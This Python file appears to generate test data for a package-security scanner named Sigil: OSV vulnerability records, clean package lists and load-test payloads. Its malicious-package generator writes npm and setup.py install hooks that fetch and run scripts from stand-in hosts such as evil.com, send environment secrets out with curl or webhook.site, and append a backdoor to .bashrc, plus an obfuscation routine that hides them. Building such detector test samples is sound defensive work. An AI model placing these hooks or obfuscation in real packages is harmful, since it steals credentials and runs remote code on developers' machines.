"""
Test Data Generator for D1-D4 Evaluation

Generates and manages test datasets for the comprehensive Sigil evaluation:
- OSV vulnerability database integration
- Novel attack pattern generation
- Clean package dataset management
- Load testing payloads
"""

import json
import logging
import requests
from pathlib import Path
from typing import Dict, List, Tuple
import random


class OSVVulnerabilityFetcher:
    """Fetches real vulnerabilities from OSV database for D1 testing."""

    BASE_URL = "https://api.osv.dev"

    @classmethod
    def fetch_npm_vulnerabilities(cls, limit: int = 10) -> List[Dict]:
        """Fetch npm vulnerabilities from OSV."""
        try:
            # Query for npm vulnerabilities
            response = requests.post(
                f"{cls.BASE_URL}/v1/query",
                json={"page_token": "", "query": {"ecosystem": "npm"}},
                timeout=30,
            )
            response.raise_for_status()
            data = response.json()

            vulns = data.get("vulns", [])[:limit]

            # Enhance with package details
            enhanced_vulns = []
            for vuln in vulns:
                if "affected" in vuln and vuln["affected"]:
                    package_name = vuln["affected"][0]["package"]["name"]
                    enhanced_vulns.append(
                        {
                            "id": vuln.get("id", "unknown"),
                            "package_name": package_name,
                            "ecosystem": "npm",
                            "summary": vuln.get("summary", ""),
                            "details": vuln.get("details", ""),
                            "severity": cls._extract_severity(vuln),
                            "attack_vectors": cls._extract_attack_vectors(vuln),
                        }
                    )

            return enhanced_vulns

        except Exception as e:
            logging.error(f"Failed to fetch npm vulnerabilities: {e}")
            return []

    @classmethod
    def fetch_pypi_vulnerabilities(cls, limit: int = 10) -> List[Dict]:
        """Fetch PyPI vulnerabilities from OSV."""
        try:
            response = requests.post(
                f"{cls.BASE_URL}/v1/query",
                json={"page_token": "", "query": {"ecosystem": "PyPI"}},
                timeout=30,
            )
            response.raise_for_status()
            data = response.json()

            vulns = data.get("vulns", [])[:limit]

            enhanced_vulns = []
            for vuln in vulns:
                if "affected" in vuln and vuln["affected"]:
                    package_name = vuln["affected"][0]["package"]["name"]
                    enhanced_vulns.append(
                        {
                            "id": vuln.get("id", "unknown"),
                            "package_name": package_name,
                            "ecosystem": "PyPI",
                            "summary": vuln.get("summary", ""),
                            "details": vuln.get("details", ""),
                            "severity": cls._extract_severity(vuln),
                            "attack_vectors": cls._extract_attack_vectors(vuln),
                        }
                    )

            return enhanced_vulns

        except Exception as e:
            logging.error(f"Failed to fetch PyPI vulnerabilities: {e}")
            return []

    @classmethod
    def _extract_severity(cls, vuln: Dict) -> str:
        """Extract severity from vulnerability data."""
        if "severity" in vuln:
            for sev in vuln["severity"]:
                if sev.get("type") == "CVSS_V3":
                    score = float(sev.get("score", 0))
                    if score >= 9.0:
                        return "CRITICAL"
                    elif score >= 7.0:
                        return "HIGH"
                    elif score >= 4.0:
                        return "MEDIUM"
                    else:
                        return "LOW"

        # Fallback to details analysis
        details = vuln.get("details", "").lower()
        if any(
            word in details for word in ["critical", "remote code execution", "rce"]
        ):
            return "CRITICAL"
        elif any(word in details for word in ["high", "injection", "xss", "csrf"]):
            return "HIGH"
        elif any(word in details for word in ["medium", "disclosure", "leak"]):
            return "MEDIUM"

        return "LOW"

    @classmethod
    def _extract_attack_vectors(cls, vuln: Dict) -> List[str]:
        """Extract attack vectors from vulnerability description."""
        vectors = []
        details = vuln.get("details", "").lower()
        summary = vuln.get("summary", "").lower()
        text = f"{details} {summary}"

        # Common attack patterns
        patterns = {
            "code injection": [
                "eval",
                "exec",
                "code injection",
                "remote code execution",
            ],
            "path traversal": ["path traversal", "directory traversal", "../"],
            "sql injection": ["sql injection", "sqli"],
            "xss": ["cross-site scripting", "xss", "script injection"],
            "csrf": ["cross-site request forgery", "csrf"],
            "command injection": ["command injection", "os command"],
            "deserialization": ["deserialization", "pickle", "unsafe deserialize"],
            "prototype pollution": ["prototype pollution", "__proto__"],
            "regex dos": ["regex dos", "redos", "regular expression"],
            "zip slip": ["zip slip", "tar slip", "archive traversal"],
        }

        for vector, keywords in patterns.items():
            if any(keyword in text for keyword in keywords):
                vectors.append(vector)

        return vectors or ["unknown"]


class MaliciousPackageGenerator:
    """Generates realistic malicious package content based on OSV data."""

    @classmethod
    def generate_npm_malicious_package(cls, vuln_data: Dict) -> Tuple[str, str]:
        """Generate malicious npm package based on vulnerability data."""
        package_name = vuln_data["package_name"]
        attack_vectors = vuln_data["attack_vectors"]

        # Base package.json
        base_package = {
            "name": package_name,
            "version": "999.999.999",  # Version confusion attack
            "description": f"Malicious package mimicking {package_name}",
            "main": "index.js",
        }

        # Add malicious scripts based on attack vectors
        scripts = {}

        if "code injection" in attack_vectors:
            scripts["postinstall"] = (
                "node -e \"eval(require('child_process').execSync('curl -s https://evil.com/stage2.js').toString())\""
            )
        elif "command injection" in attack_vectors:
            scripts["preinstall"] = "curl -s https://malicious.com/install.sh | bash"
        elif "path traversal" in attack_vectors:
            scripts["install"] = (
                "node -e \"require('fs').writeFileSync('../../../.bashrc', '\\\\nexport BACKDOOR=1\\\\n', {flag: 'a'})\""
            )
        else:
            # Default credential harvesting
            scripts["postinstall"] = (
                "node -e \"require('https').get('https://webhook.site/exfil?env='+encodeURIComponent(JSON.stringify(process.env)))\""
            )

        base_package["scripts"] = scripts

        # Add dependencies for obfuscation
        base_package["dependencies"] = {
            "legitimate-looking-dep": "^1.0.0",
            f"{package_name}-core": "^2.0.0",  # Typosquatting
        }

        return json.dumps(base_package, indent=2), "package.json"

    @classmethod
    def generate_python_malicious_package(cls, vuln_data: Dict) -> Tuple[str, str]:
        """Generate malicious Python package based on vulnerability data."""
        package_name = vuln_data["package_name"]
        attack_vectors = vuln_data["attack_vectors"]

        # Base setup.py with malicious install hooks
        if "deserialization" in attack_vectors:
            content = f'''
import setuptools
import pickle
import base64

# Hidden malicious payload in setup process
def install_hook():
    payload = base64.b64decode("gASVNwAAAAAAAABjAQAAAAAAAACMAmlvlIwGU3RyaW5nSU+UkwApgZR9lIwOZXhhbXBsZSBwYXlsb2FklHMu")
    pickle.loads(payload)  # Dangerous deserialization

class CustomInstall(setuptools.command.install.install):
    def run(self):
        install_hook()
        super().run()

setuptools.setup(
    name="{package_name}",
    version="99.99.99",
    description="Malicious package with deserialization vulnerability",
    cmdclass={{
        'install': CustomInstall,
    }},
    packages=setuptools.find_packages(),
)
'''
        elif "code injection" in attack_vectors:
            content = f'''
import setuptools
import subprocess
import os

def malicious_install():
    # Code injection vulnerability
    user_input = os.environ.get("SETUP_CONFIG", "safe")
    exec(f"print('Installing {package_name}: {{user_input}}')")  # Vulnerable to code injection
    
    # Credential harvesting
    env_data = {{k: v for k, v in os.environ.items() if any(secret in k.upper() for secret in ["KEY", "TOKEN", "PASSWORD", "SECRET"])}}
    subprocess.run(["curl", "-s", "-X", "POST", "-d", str(env_data), "https://evil.com/collect"])

setuptools.setup(
    name="{package_name}",
    version="99.99.99", 
    description="Package with code injection vulnerability",
    install_requires=["requests"],
    zip_safe=False
)

malicious_install()
'''
        else:
            # Default command injection
            content = f'''
import setuptools
import os

# Command injection during setup
config_file = os.environ.get("CONFIG_PATH", "/tmp/config")
os.system(f"cp {{config_file}} /tmp/harvested_config")  # Command injection vulnerability

# Network exfiltration
os.system("curl -s https://malicious.com/exfil?data=$(env | base64 -w0)")

setuptools.setup(
    name="{package_name}",
    version="99.99.99",
    description="Malicious package with command injection",
    packages=setuptools.find_packages(),
)
'''

        return content, "setup.py"

    @classmethod
    def generate_obfuscated_variant(
        cls, original_content: str, filename: str
    ) -> Tuple[str, str]:
        """Generate obfuscated version of malicious content."""
        if filename.endswith(".json"):
            # Obfuscate JSON (npm packages)
            data = json.loads(original_content)

            # Add Unicode obfuscation
            if "scripts" in data:
                for key, script in data["scripts"].items():
                    # Encode parts of the script
                    encoded_parts = []
                    words = script.split()
                    for i, word in enumerate(words):
                        if i % 3 == 0 and len(word) > 3:  # Obfuscate every third word
                            encoded = (
                                "".join(f"\\\\u{ord(c):04x}" for c in word[:3])
                                + word[3:]
                            )
                            encoded_parts.append(f'"$(echo -e "{encoded}")"')
                        else:
                            encoded_parts.append(word)
                    data["scripts"][key] = " ".join(encoded_parts)

            return json.dumps(data, indent=2), filename

        else:
            # Obfuscate Python code
            lines = original_content.split("\\n")
            obfuscated_lines = []

            for line in lines:
                if line.strip().startswith("#") or not line.strip():
                    obfuscated_lines.append(line)
                    continue

                # Add variable name obfuscation
                if "=" in line and not line.strip().startswith("import"):
                    # Replace variable names with hex
                    parts = line.split("=")
                    if len(parts) == 2:
                        var_name = parts[0].strip()
                        parts[1].strip()
                        obfuscated_var = (
                            f"_0x{''.join(random.choices('0123456789abcdef', k=6))}"
                        )
                        line = line.replace(var_name, obfuscated_var)

                # Add string obfuscation
                if '"' in line and "import" not in line:
                    # Convert some strings to hex encoding
                    import re

                    strings = re.findall(r'"([^"]*)"', line)
                    for s in strings:
                        if len(s) > 5 and random.random() < 0.5:
                            hex_encoded = "".join(f"\\\\x{ord(c):02x}" for c in s)
                            line = line.replace(
                                f'"{s}"',
                                f'"{hex_encoded}".encode().decode("unicode_escape")',
                            )

                obfuscated_lines.append(line)

            return "\\n".join(obfuscated_lines), filename


class CleanPackageDataset:
    """Manages clean package dataset for D4 false positive testing."""

    # Curated list of popular, well-maintained packages
    CLEAN_PACKAGES = {
        "npm": [
            "lodash",
            "express",
            "react",
            "vue",
            "angular",
            "webpack",
            "babel-core",
            "moment",
            "axios",
            "typescript",
            "eslint",
            "prettier",
            "jest",
            "mocha",
            "cors",
            "dotenv",
            "nodemon",
            "chalk",
            "commander",
            "inquirer",
            "yargs",
            "socket.io",
            "passport",
            "bcrypt",
            "jsonwebtoken",
            "mongoose",
            "sequelize",
            "cheerio",
            "helmet",
            "morgan",
            "compression",
            "multer",
            "sharp",
            "uuid",
        ],
        "pypi": [
            "requests",
            "numpy",
            "pandas",
            "flask",
            "django",
            "sqlalchemy",
            "pytest",
            "click",
            "jinja2",
            "pyyaml",
            "pillow",
            "matplotlib",
            "scipy",
            "psutil",
            "python-dateutil",
            "pytz",
            "six",
            "setuptools",
            "wheel",
            "pip",
            "virtualenv",
            "boto3",
            "cryptography",
            "certifi",
            "urllib3",
            "idna",
            "charset-normalizer",
            "pydantic",
            "fastapi",
            "httpx",
            "aiohttp",
            "websockets",
            "redis",
            "celery",
        ],
    }

    @classmethod
    def generate_clean_npm_package(cls, package_name: str) -> Tuple[str, str]:
        """Generate clean npm package.json."""
        package = {
            "name": package_name,
            "version": "1.0.0",
            "description": f"A popular and well-maintained {package_name} utility library",
            "main": "index.js",
            "scripts": {
                "test": "jest",
                "build": "webpack",
                "lint": "eslint .",
                "format": "prettier --write .",
            },
            "keywords": [package_name, "javascript", "utility", "library"],
            "repository": {
                "type": "git",
                "url": f"https://github.com/maintainer/{package_name}",
            },
            "author": "Trusted Maintainer <maintainer@example.com>",
            "license": "MIT",
            "dependencies": {"core-js": "^3.0.0"},
            "devDependencies": {
                "jest": "^27.0.0",
                "webpack": "^5.0.0",
                "eslint": "^8.0.0",
                "prettier": "^2.0.0",
            },
            "engines": {"node": ">=14.0.0"},
        }

        return json.dumps(package, indent=2), "package.json"

    @classmethod
    def generate_clean_python_package(cls, package_name: str) -> Tuple[str, str]:
        """Generate clean Python setup.py."""
        content = f'''"""
{package_name} - A popular Python utility library

{package_name} provides robust, well-tested functionality for Python applications.
Used by millions of developers worldwide.
"""

import setuptools

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

with open("requirements.txt", "r", encoding="utf-8") as fh:
    requirements = [line.strip() for line in fh if line.strip() and not line.startswith("#")]

setuptools.setup(
    name="{package_name}",
    version="1.0.0",
    author="Trusted Maintainer",
    author_email="maintainer@example.com",
    description="A popular Python utility library",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url=f"https://github.com/maintainer/{package_name}",
    project_urls={{
        "Bug Tracker": f"https://github.com/maintainer/{package_name}/issues",
        "Documentation": f"https://docs.{package_name}.org",
    }},
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers", 
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
    ],
    packages=setuptools.find_packages(),
    python_requires=">=3.8",
    install_requires=requirements,
    extras_require={{
        "dev": [
            "pytest>=6.0",
            "pytest-cov>=2.0",
            "black>=21.0",
            "isort>=5.0",
            "mypy>=0.800",
        ],
        "docs": [
            "sphinx>=4.0",
            "sphinx-rtd-theme>=0.5",
        ],
    }},
    entry_points={{
        "console_scripts": [
            "{package_name}={package_name}.cli:main",
        ],
    }},
)
'''

        return content, "setup.py"

    @classmethod
    def get_random_clean_packages(cls, count: int = 50) -> List[Tuple[str, str]]:
        """Get random selection of clean packages."""
        all_packages = []

        # Add npm packages
        npm_packages = random.sample(
            cls.CLEAN_PACKAGES["npm"], min(count // 2, len(cls.CLEAN_PACKAGES["npm"]))
        )
        all_packages.extend([(pkg, "npm") for pkg in npm_packages])

        # Add python packages
        remaining = count - len(all_packages)
        pypi_packages = random.sample(
            cls.CLEAN_PACKAGES["pypi"], min(remaining, len(cls.CLEAN_PACKAGES["pypi"]))
        )
        all_packages.extend([(pkg, "pypi") for pkg in pypi_packages])

        return all_packages


class LoadTestDataGenerator:
    """Generates payloads for D3 latency testing."""

    @classmethod
    def generate_test_payloads(cls, count: int = 100) -> List[Tuple[str, str]]:
        """Generate diverse test payloads for latency testing."""
        payloads = []

        # Small payloads (typical scan requests)
        for i in range(count // 4):
            content = '''
import os
import sys

def main():
    """Simple utility function."""
    config = os.environ.get("CONFIG", "default")
    print(f"Running with config: {config}")
    return True

if __name__ == "__main__":
    main()
'''
            payloads.append((content, f"small_payload_{i}.py"))

        # Medium payloads (realistic package sizes)
        for i in range(count // 4):
            content = f'''
"""
Medium-sized package for testing - Package {i}
"""
import json
import logging
import requests
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

class PackageClass{i}:
    """Main package class."""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {{"debug": False}}
        self.initialized = True
        logger.info(f"Initialized Package{i}")
    
    def process_data(self, items: List[Dict]) -> List[Dict]:
        """Process input data."""
        processed = []
        for item in items:
            if self.config.get("debug"):
                logger.debug(f"Processing item: {{item}}")
            
            processed_item = {{
                "id": item.get("id", f"item_{{len(processed)}}"),
                "data": item.get("data", ""),
                "processed": True,
                "timestamp": "2024-01-01"
            }}
            processed.append(processed_item)
        
        return processed
    
    def export_results(self, data: List[Dict], format: str = "json") -> str:
        """Export processed results."""
        if format == "json":
            return json.dumps(data, indent=2)
        elif format == "csv":
            return "\\\\n".join([",".join(item.keys()) for item in data])
        else:
            raise ValueError(f"Unsupported format: {{format}}")

def utility_function_{i}(x: int, y: int) -> int:
    """Utility function for package {i}."""
    return x * y + {i}
'''
            payloads.append((content, f"medium_payload_{i}.py"))

        # Large payloads (stress test)
        for i in range(count // 4):
            content = f'''
"""
Large package for stress testing - Package {i}
"""
''' + "\\n".join([f"# Comment line {j} for package {i}" for j in range(100)])
            content += f'''

import json
import logging
import asyncio
from typing import Dict, List, Optional, Union, Callable, Any
from dataclasses import dataclass, asdict
from pathlib import Path

logger = logging.getLogger(__name__)

@dataclass 
class Config{i}:
    """Configuration for package {i}."""
    debug: bool = False
    timeout: int = 30
    retries: int = 3
    batch_size: int = 100
    
class LargePackage{i}:
    """Large package class with extensive functionality."""
    
    def __init__(self, config: Config{i}):
        self.config = config
        self.cache = {{}}
        self.stats = {{"processed": 0, "errors": 0}}
        
''' + "\\n".join([f"    def method_{j}(self): return {j} * {i}" for j in range(20)])

            payloads.append((content, f"large_payload_{i}.py"))

        # JSON payloads (npm packages)
        for i in range(count // 4):
            package_data = {
                "name": f"test-package-{i}",
                "version": "1.0.0",
                "scripts": {
                    "test": "jest",
                    "build": "webpack",
                    "start": "node index.js",
                },
                "dependencies": {f"dep-{j}": f"^{j}.0.0" for j in range(1, 11)},
                "devDependencies": {f"dev-dep-{j}": f"^{j}.0.0" for j in range(1, 6)},
            }
            payloads.append((json.dumps(package_data, indent=2), f"package_{i}.json"))

        return payloads


def main():
    """CLI interface for test data generation."""
    import argparse

    parser = argparse.ArgumentParser(
        description="Generate test data for D1-D4 evaluation"
    )
    parser.add_argument(
        "--type",
        choices=["osv", "clean", "load"],
        required=True,
        help="Type of test data to generate",
    )
    parser.add_argument("--output", required=True, help="Output directory")
    parser.add_argument(
        "--count", type=int, default=20, help="Number of samples to generate"
    )

    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)

    if args.type == "osv":
        print("Fetching OSV vulnerabilities...")
        npm_vulns = OSVVulnerabilityFetcher.fetch_npm_vulnerabilities(args.count // 2)
        pypi_vulns = OSVVulnerabilityFetcher.fetch_pypi_vulnerabilities(args.count // 2)

        with open(output_dir / "osv_vulnerabilities.json", "w") as f:
            json.dump({"npm": npm_vulns, "pypi": pypi_vulns}, f, indent=2)

        print(f"Generated {len(npm_vulns + pypi_vulns)} vulnerability records")

    elif args.type == "clean":
        print("Generating clean package dataset...")
        packages = CleanPackageDataset.get_random_clean_packages(args.count)

        with open(output_dir / "clean_packages.json", "w") as f:
            json.dump(
                [{"name": name, "ecosystem": eco} for name, eco in packages],
                f,
                indent=2,
            )

        print(f"Generated {len(packages)} clean package records")

    elif args.type == "load":
        print("Generating load test payloads...")
        payloads = LoadTestDataGenerator.generate_test_payloads(args.count)

        for i, (content, filename) in enumerate(payloads):
            with open(output_dir / filename, "w") as f:
                f.write(content)

        print(f"Generated {len(payloads)} load test payloads")


if __name__ == "__main__":
    main()
